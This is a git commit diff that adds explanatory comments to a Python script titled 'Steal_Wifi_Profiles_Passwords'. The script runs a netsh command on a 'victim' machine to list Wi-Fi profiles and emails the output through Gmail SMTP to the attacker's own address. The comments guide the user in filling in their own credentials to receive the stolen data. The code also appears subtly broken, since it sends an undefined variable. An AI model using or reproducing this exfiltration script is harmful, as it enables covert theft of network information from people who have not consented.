b2acaceff1df11a4bbc5874c39ab14c83e503e1c
tronicflux <54644959+tronicflux@users.noreply.github.com>
2020-05-15 02:35:33 +0530

    Update 1-Steal_Wifi_Profiles_Passwords.py

--- 1-Steal_Wifi_Profiles_Passwords.py
+++ 1-Steal_Wifi_Profiles_Passwords.py
@@ -2,13 +2,13 @@
 import subprocess, smtplib
 
 def send_mail(email,password,message):
-    server=smtplib.SMTP("smtp.gmail.com", 587)
+    server=smtplib.SMTP("smtp.gmail.com", 587)         # Don't Change the Port from the value of 587 
     server.starttls()
     server.login(email,password)
-    server.sendmail(email,email,message)
+    server.sendmail(email,email,message)               #This lines will forward the mail to your own mail.
     server.quit()
 
 
-command="netsh wlan show profile"
+command="netsh wlan show profile"                     #input put the cmd command to gather information from the victim. 
 networks=subprocess.check_output(command,shell=True,timeout=1)
-send_mail("","",result)
+send_mail("Enter Your Email","Email Password",result) #just put the email address and email password so you receive the data.                         
